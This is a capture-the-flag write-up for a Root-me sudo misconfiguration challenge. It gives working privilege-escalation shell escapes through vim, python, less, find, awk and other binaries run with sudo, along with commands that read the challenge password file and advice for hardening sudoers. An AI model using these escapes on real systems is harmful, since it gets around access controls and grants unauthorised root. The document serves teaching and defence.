# Sudo - Weak Configuration

**Category:** App-Script  
**Difficulty:** ⭐⭐ (Medium)  
**Points:** 15  
**Platform:** Root-me

---

## 📋 Challenge Description

This challenge demonstrates how misconfigured sudo permissions can lead to privilege escalation. Sudo allows users to run commands with elevated privileges, but weak configurations can be exploited to gain root access.

**Objective:** Exploit sudo misconfigurations to read the password file.

---

## 🎯 Learning Objectives

- Understand sudo permission model
- Identify sudo misconfigurations
- Exploit sudo NOPASSWD entries
- Use GTFOBins for exploitation
- Achieve privilege escalation

---

## 🔍 Enumeration

### Step 1: Check Sudo Privileges

The first step in any privilege escalation is checking sudo permissions:

```bash
sudo -l
```

**Expected Output:**
```
User app-script-ch11 may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/python
```

This output shows:
- User can run `vim` and `python` as root
- No password required (NOPASSWD)
- Commands run with root privileges

---

## 💥 Exploitation

### Method 1: Exploiting Vim

Vim has command execution capabilities that can be abused:

```bash
# Start vim with sudo
sudo vim

# Inside vim, execute shell command
:!bash

# You now have root shell
whoami
# Output: root

# Read the password
cat /challenge/app-script/ch11/.passwd
```

**Alternative vim techniques:**
```bash
# Method 1: Shell escape
sudo vim -c ':!bash'

# Method 2: Open file and execute
sudo vim /tmp/test
:set shell=/bin/bash
:shell

# Method 3: Direct command execution
sudo vim -c ':!/bin/bash' -c ':q'
```

### Method 2: Exploiting Python

Python can also be used to spawn a shell:

```bash
# Method 1: Using os.system
sudo python -c 'import os; os.system("/bin/bash")'

# Method 2: Using subprocess
sudo python -c 'import subprocess; subprocess.call(["/bin/bash"])'

# Method 3: Using pty for interactive shell
sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

### Reading the Password

Once you have root access:

```bash
# Navigate to challenge directory
cd /challenge/app-script/ch11

# Read the password
cat .passwd

# Or use find
find /challenge -name ".passwd" 2>/dev/null -exec cat {} \;
```

---

## 🔑 Solution

**Steps:**
1. Connect to challenge: `ssh app-script-ch11@challenge.root-me.org`
2. Check sudo privileges: `sudo -l`
3. Identify exploitable command (vim or python)
4. Spawn root shell: `sudo vim -c ':!bash'`
5. Read password: `cat /challenge/app-script/ch11/.passwd`

**Password:** `[hidden for learning purposes]`

---

## 📚 Lessons Learned

### 1. Sudo Security Model

**How Sudo Works:**
```
User -> sudoers file -> Permission check -> Execute as target user
```

**sudoers File Location:**
```bash
/etc/sudoers    # Main configuration
/etc/sudoers.d/ # Additional configurations
```

**sudoers Syntax:**
```
username  ALL=(runasuser) NOPASSWD: /path/to/command
│         │   │           │         │
│         │   │           │         └─ Command path
│         │   │           └─────────── No password required
│         │   └─────────────────────── Run as this user
│         └─────────────────────────── On all hosts
└───────────────────────────────────── User who can run it
```

### 2. Common Sudo Misconfigurations

**Dangerous Configurations:**

```bash
# Any user can run anything
user ALL=(ALL) NOPASSWD: ALL

# Text editors (can spawn shells)
user ALL=(ALL) NOPASSWD: /usr/bin/vim
user ALL=(ALL) NOPASSWD: /usr/bin/nano
user ALL=(ALL) NOPASSWD: /usr/bin/emacs

# Scripting languages (can execute arbitrary code)
user ALL=(ALL) NOPASSWD: /usr/bin/python
user ALL=(ALL) NOPASSWD: /usr/bin/perl
user ALL=(ALL) NOPASSWD: /usr/bin/ruby

# Command with wildcards
user ALL=(ALL) NOPASSWD: /bin/systemctl * apache2
```

### 3. GTFOBins

GTFOBins (https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited for privilege escalation.

**Common GTFOBins for Sudo:**

```bash
# vim
sudo vim -c ':!bash'

# less
sudo less /etc/profile
!/bin/bash

# more
sudo more /etc/profile
!/bin/bash

# find
sudo find / -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python
sudo python -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# lua
sudo lua -e 'os.execute("/bin/bash")'
```

### 4. Privilege Escalation Prevention

**Secure Sudo Configuration:**

```bash
# Restrict to specific command with full path
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2

# Deny shell escape
Defaults    noexec

# Require password
user ALL=(ALL) /usr/bin/vim

# Use command aliases for multiple commands
Cmnd_Alias NETWORKING = /sbin/route, /sbin/ifconfig
user ALL=(ALL) NETWORKING

# Set timeout
Defaults    timestamp_timeout=0
```

---

## 🛡️ Remediation

### For System Administrators

1. **Minimize Sudo Access**
   ```bash
   # Only grant specific commands
   user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart service_name
   ```

2. **Avoid Wildcards**
   ```bash
   # Bad
   user ALL=(ALL) /usr/bin/systemctl * service
   
   # Good
   user ALL=(ALL) /usr/bin/systemctl restart service
   user ALL=(ALL) /usr/bin/systemctl stop service
   ```

3. **Audit Sudoers Regularly**
   ```bash
   # Check syntax
   visudo -c
   
   # Review all sudo privileges
   cat /etc/sudoers
   ls -la /etc/sudoers.d/
   ```

4. **Use Sudo Logging**
   ```bash
   # Enable sudo logging
   Defaults    logfile="/var/log/sudo.log"
   Defaults    log_input, log_output
   ```

5. **Implement Least Privilege**
   - Only grant necessary permissions
   - Require passwords when possible
   - Regular permission audits
   - Use groups for role-based access

### Checking Your System

```bash
# List your sudo privileges
sudo -l

# Check sudoers file
sudo cat /etc/sudoers

# Check sudoers.d directory
sudo ls -la /etc/sudoers.d/

# Review sudo logs
sudo cat /var/log/sudo.log
```

---

## 🔧 Tools & Resources

### Enumeration Tools
- **sudo -l** - List sudo privileges
- **LinPEAS** - Automated Linux enumeration
- **LinEnum** - Linux enumeration script

### Exploitation Resources
- **GTFOBins** - https://gtfobins.github.io/
- **LOLBAS** - Living Off The Land Binaries (Windows)
- **PayloadsAllTheThings** - Privilege escalation techniques

---

## 📖 References

- [Sudo Manual](https://www.sudo.ws/docs/man/1.8.15/sudo.man/)
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [Sudoers File Format](https://www.sudo.ws/docs/man/1.8.15/sudoers.man/)

---

## 💡 Additional Practice

### Similar Challenges
1. **Sudo - Weak Configuration 2** - More advanced sudo exploitation
2. **SUID Binaries** - Alternative privilege escalation
3. **Linux PrivEsc** - Comprehensive privilege escalation

### Real-World Scenarios
- Penetration testing engagements
- Security audits
- CTF competitions
- Bug bounty programs

---

**Date Completed:** November 2025  
**Time Taken:** 20 minutes  
**Difficulty Rating:** 5/10

---

*Understanding sudo misconfigurations is crucial for both attackers and defenders!*
